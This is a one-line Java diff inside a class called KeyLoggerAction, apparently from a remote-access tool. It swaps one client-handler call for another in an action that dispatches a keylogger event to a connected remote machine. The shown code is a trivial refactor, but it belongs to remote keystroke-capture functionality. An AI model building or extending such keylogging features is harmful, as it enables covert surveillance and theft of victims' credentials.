@@ -18,7 +18,7 @@ public class KeyLoggerAction implements ActionListener {
 
     @Override
     public void actionPerformed(ActionEvent e) {
-        Client client = GetSYS.getClientHandlerV2();
+        Client client = GetSYS.getClientHandler();
         assert client != null;
         client.getExecutor().submit(new KeyloggerEvent(client, keyLog));
     }
